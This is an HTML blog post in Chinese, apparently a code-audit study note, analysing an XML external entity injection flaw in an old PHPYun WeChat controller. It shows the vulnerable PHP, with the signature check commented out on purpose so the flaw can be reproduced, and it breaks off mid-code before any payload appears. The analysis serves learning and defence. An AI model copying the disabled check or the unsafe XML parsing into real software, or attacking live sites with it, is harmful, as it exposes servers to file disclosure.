@@ -1,0 +1,707 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="PHPYun XML实体注入，这个漏洞存在比较老的版本，新的版本已被修复。来分析学习xml实体注入是怎么产生的。
+可以暂停音乐哦！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="审计学习笔记二">
+<meta property="og:url" content="http://yoursite.com/2016/07/20/审计学习笔记二/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="PHPYun XML实体注入，这个漏洞存在比较老的版本，新的版本已被修复。来分析学习xml实体注入是怎么产生的。
+可以暂停音乐哦！">
+<meta property="og:image" content="http://evilanne.github.io/images/img/14689203260102.jpg">
+<meta property="og:image" content="http://evilanne.github.io/images/img/14689231850106.jpg">
+<meta property="og:image" content="http://evilanne.github.io/images/img/14689233427860.jpg">
+<meta property="og:image" content="http://evilanne.github.io/images/img/14689233656655.jpg">
+<meta property="og:image" content="http://evilanne.github.io/images/img/14689233985962.jpg">
+<meta property="og:updated_time" content="2016-07-21T16:09:00.951Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="审计学习笔记二">
+<meta name="twitter:description" content="PHPYun XML实体注入，这个漏洞存在比较老的版本，新的版本已被修复。来分析学习xml实体注入是怎么产生的。
+可以暂停音乐哦！">
+<meta name="twitter:image" content="http://evilanne.github.io/images/img/14689203260102.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> 审计学习笔记二 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                审计学习笔记二
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-20T04:19:10+08:00" content="2016-07-20">
+              2016-07-20
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/20/审计学习笔记二/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/20/审计学习笔记二/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>PHPYun XML实体注入，这个漏洞存在比较老的版本，新的版本已被修复。<br>来分析学习xml实体注入是怎么产生的。</p>
+<font color="red">可以暂停音乐哦！ </font>
+
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=5411676&auto=0&height=66"></iframe>
+
+
+<a id="more"></a>
+<p>新版本修复了漏洞，所以我将其安全检测注释掉，否则漏洞无法复现成功：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$this-&gt;checkSignature())&#123;<span class="keyword">echo</span> <span class="string">"非法来源地址！"</span>;<span class="keyword">exit</span>();&#125;;</span><br></pre></td></tr></table></figure>
+<p><img src="http://evilanne.github.io/images/img/14689203260102.jpg" alt="">￼</p>
+<p>File：/weixin/model/index.clss.php<br>Code: 13</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">class index_controller extends common</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public $MsgType;</span><br><span class="line"></span><br><span class="line">	public function index_action()</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		if($_GET["echostr"])		</span><br><span class="line"></span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			$this-&gt;valid();</span><br><span class="line"></span><br><span class="line">		&#125;else&#123;</span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			//if(!$this-&gt;checkSignature())&#123;echo "非法来源地址！";exit();&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];</span><br><span class="line"></span><br><span class="line">			if (!empty($postStr))</span><br><span class="line"></span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">			  $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);  </span><br><span class="line"></span><br><span class="line">			  $fromUsername = $postObj-&gt;FromUserName;</span><br><span class="line"></span><br><span class="line">			  $toUsername = $postObj-&gt;ToUserName;</span><br><span class="line"></span><br><span class="line">			  $keyword = trim($postObj-&gt;Content);</span><br><span class="line"></span><br><span class="line">			  $times = time();</span><br><span class="line"></span><br><span class="line">			  $MsgType = $postObj-&gt;MsgType;</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $topTpl = "&lt;xml&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;CreateTime&gt;%s&lt;/CreateTime&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;</span><br><span class="line"></span><br><span class="line">				   ";</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $bottomStr = "&lt;FuncFlag&gt;0&lt;/FuncFlag&gt;&lt;/xml&gt;";</span><br><span class="line"></span><br><span class="line">			  </span><br><span class="line"></span><br><span class="line">			  if($MsgType=='event')</span><br><span class="line"></span><br><span class="line">			  &#123;</span><br><span class="line"></span><br><span class="line">				$MsgEvent = $postObj-&gt;Event;</span><br><span class="line"></span><br><span class="line">				if ($MsgEvent=='subscribe')</span><br><span class="line"></span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					$centerStr = "&lt;Content&gt;&lt;![CDATA[欢迎您关注".iconv('gbk','utf-8',$this-&gt;config['sy_webname'])."！\n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位\n绑定您的账户体验更多精彩功能\n感谢您的关注！]]&gt;&lt;/Content&gt;";</span><br><span class="line"></span><br><span class="line">					$this-&gt;MsgType = 'text';</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				&#125;elseif ($MsgEvent=='CLICK')</span><br><span class="line"></span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					$EventKey = $postObj-&gt;EventKey;</span><br><span class="line"></span><br><span class="line">					if($EventKey=='myaccount')&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;bindUser($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='我的消息')</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;myMsg($fromUsername);</span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='面试邀请')</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;Audition($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='简历查看')</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;lookResume($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='刷新简历')</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;refResume($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='推荐职位')</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;recJob();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;elseif($EventKey=='职位搜索')&#123;</span><br><span class="line"></span><br><span class="line">						</span><br><span class="line"></span><br><span class="line">						$centerStr = "&lt;Content&gt;&lt;![CDATA[直接回复城市、职位、公司名称等关键字搜索您需要的职位信息。\n 如：【经理】、【南京 经理】、【南京 xx公司】]]&gt;&lt;/Content&gt;";</span><br><span class="line"></span><br><span class="line">						$this-&gt;MsgType = 'text';</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			  &#125;elseif($MsgType=='text')&#123;</span><br><span class="line"></span><br><span class="line">				if($keyword)&#123;</span><br><span class="line"></span><br><span class="line">					</span><br><span class="line"></span><br><span class="line">					$centerStr = $this-&gt;searchJob($keyword);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			  &#125;</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $topStr = sprintf($topTpl, $fromUsername, $toUsername, $times, $this-&gt;MsgType);</span><br><span class="line"></span><br><span class="line">			  echo $topStr.$centerStr.$bottomStr;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>先来慢慢分析一下<br>定义一个属性$MsgType,后面判断echostr是否通过GET方式提交，如果是则调用valid()方法<br>这里先不往下读，先跟进valid()方法是做什么的：</p>
+<p>Code:482</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">valid</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">   </span>&#123;</span><br><span class="line"></span><br><span class="line">       $echoStr = $_GET[<span class="string">"echostr"</span>];</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($this-&gt;checkSignature())&#123;</span><br><span class="line"></span><br><span class="line">       	<span class="keyword">echo</span> $echoStr;</span><br><span class="line"></span><br><span class="line">       	<span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>获取$_GET[“echostr”];的值进行checkSignature()处理再继续跟进这个方法是做什么的。</p>
+<p>Code:491</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkSignature</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">	</span>&#123;</span><br><span class="line"></span><br><span class="line">        $signature = $_GET[<span class="string">"signature"</span>];</span><br><span class="line"></span><br><span class="line">        $timestamp = $_GET[<span class="string">"timestamp"</span>];</span><br><span class="line"></span><br><span class="line">        $nonce = $_GET[<span class="string">"nonce"</span>];	</span><br><span class="line"></span><br><span class="line">        		</span><br><span class="line"></span><br><span class="line">		$token = $this-&gt;config[<span class="string">'wx_token'</span>];</span><br><span class="line"></span><br><span class="line">		$tmpArr = <span class="keyword">array</span>($token, $timestamp, $nonce);</span><br><span class="line"></span><br><span class="line">		sort($tmpArr, SORT_STRING);</span><br><span class="line"></span><br><span class="line">		$tmpStr = implode( $tmpArr );</span><br><span class="line"></span><br><span class="line">		$tmpStr = sha1( $tmpStr );</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>( $tmpStr == $signature  &amp;&amp; $token!=<span class="string">''</span>)&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>主要是检查签名，还有$token是否不为空。 而这里的wx_token默认是为空的，所以这里有一项条件不成功，则反回false。</p>
+<p>所以这里就跟进完了，valid()这个方法是用来检查签名的</p>
+<p>然后继续往下：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$postStr = $GLOBALS["HTTP_RAW_POST_DATA"];</span><br><span class="line"></span><br><span class="line">			if (!empty($postStr))</span><br><span class="line"></span><br><span class="line">			&#123;</span><br><span class="line"></span><br><span class="line">			  $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA);  </span><br><span class="line"></span><br><span class="line">			  $fromUsername = $postObj-&gt;FromUserName;</span><br><span class="line"></span><br><span class="line">			  $toUsername = $postObj-&gt;ToUserName;</span><br><span class="line"></span><br><span class="line">			  $keyword = trim($postObj-&gt;Content);</span><br><span class="line"></span><br><span class="line">			  $times = time();</span><br><span class="line"></span><br><span class="line">			  $MsgType = $postObj-&gt;MsgType;</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $topTpl = "&lt;xml&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;ToUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/ToUserName&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;FromUserName&gt;&lt;![CDATA[%s]]&gt;&lt;/FromUserName&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;CreateTime&gt;%s&lt;/CreateTime&gt;</span><br><span class="line"></span><br><span class="line">				   &lt;MsgType&gt;&lt;![CDATA[%s]]&gt;&lt;/MsgType&gt;</span><br><span class="line"></span><br><span class="line">				   ";</span><br><span class="line"></span><br><span class="line">			 </span><br><span class="line"></span><br><span class="line">			  $bottomStr = "&lt;FuncFlag&gt;0&lt;/FuncFlag&gt;&lt;/xml&gt;";</span><br></pre></td></tr></table></figure>
+<p>$GLOBALS[“HTTP_RAW_POST_DATA”] </p>
+<blockquote>
+<p>是PHP内置的一个全局变量。它用于，PHP在无法识别的Content-Type的情况下，将POST过来的数据原样地填入变量。</p>
+</blockquote>
+<p>所以这里获取的post获取传给了变量,然后进行了判断$postStr是否不为空，如果不为空则调用simplexml_load_string()方法，把 XML 字符串载入对象中。</p>
+<p>然后通过对象名赋值给其它变量$fromUsername等</p>
+<p>继续往下读：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($MsgType==<span class="string">'event'</span>)</span><br><span class="line"></span><br><span class="line">			  &#123;</span><br><span class="line"></span><br><span class="line">				$MsgEvent = $postObj-&gt;Event;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> ($MsgEvent==<span class="string">'subscribe'</span>)</span><br><span class="line"></span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					$centerStr = <span class="string">"&lt;Content&gt;&lt;![CDATA[欢迎您关注"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,$this-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"！\n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位\n绑定您的账户体验更多精彩功能\n感谢您的关注！]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line"></span><br><span class="line">					$this-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				&#125;<span class="keyword">elseif</span> ($MsgEvent==<span class="string">'CLICK'</span>)</span><br><span class="line"></span><br><span class="line">				&#123;</span><br><span class="line"></span><br><span class="line">					$EventKey = $postObj-&gt;EventKey;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span>($EventKey==<span class="string">'myaccount'</span>)&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;bindUser($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'我的消息'</span>)</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;myMsg($fromUsername);</span><br><span class="line"></span><br><span class="line">					&#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'面试邀请'</span>)</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;Audition($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'简历查看'</span>)</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;lookResume($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'刷新简历'</span>)</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;refResume($fromUsername);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'推荐职位'</span>)</span><br><span class="line"></span><br><span class="line">					&#123;</span><br><span class="line"></span><br><span class="line">						$centerStr = $this-&gt;recJob();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&#125;<span 